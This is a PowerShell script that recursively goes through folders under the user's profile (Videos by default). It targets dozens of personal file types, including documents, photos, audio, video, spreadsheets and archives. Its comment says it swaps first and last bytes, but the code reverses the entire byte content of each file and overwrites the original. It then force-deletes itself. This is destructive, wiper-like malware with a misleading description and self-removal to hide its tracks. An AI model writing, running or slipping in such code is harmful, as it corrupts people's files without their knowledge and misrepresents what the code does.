# Swap the first and last bytes of files in specified directories and file types (recursively)
param (
    [string[]]$directories = @("Videos"),
    [string[]]$fileTypes = @("aif", "mp3", "mpa", "ogg", "wav", "wma", "flac", "7z", "rar", "zip", "csv", "ai", "bmp", "gif", "ico", "jpg", "jpeg", "png", "psd", "svg", "webp", "ppt", "pps", "odp", "pptx", "ods", "xls", "xlsm", "xlsx", "3g2", "3gp", "avi", "flv", "h264", "h265", "m4v", "mkv", "mov", "mp4", "mpg", "mpeg", "rm", "sfw", "vob", "webm", "wmv", "doc", "docx", "odt", "pdf", "rtf", "tex", "txt", "wpd")
)

foreach ($directory in $directories) {
    $directoryPath = Join-Path $env:USERPROFILE -ChildPath $directory

    Get-ChildItem -Path $directoryPath -File -Recurse | Where-Object { $_.Extension -replace '^\.', '' -in $fileTypes } | ForEach-Object {
        $filePath = $_.FullName

        # Read the file content as bytes
        $fileBytes = [System.IO.File]::ReadAllBytes($filePath)

        # Swap the first and last bytes
        [System.Array]::Reverse($fileBytes)

        # Write the modified bytes back to the file, overwriting the original
        [System.IO.File]::WriteAllBytes($filePath, $fileBytes)
    }
}

$currentScriptPath = $MyInvocation.MyCommand.Path
Remove-Item -Path $currentScriptPath -Force
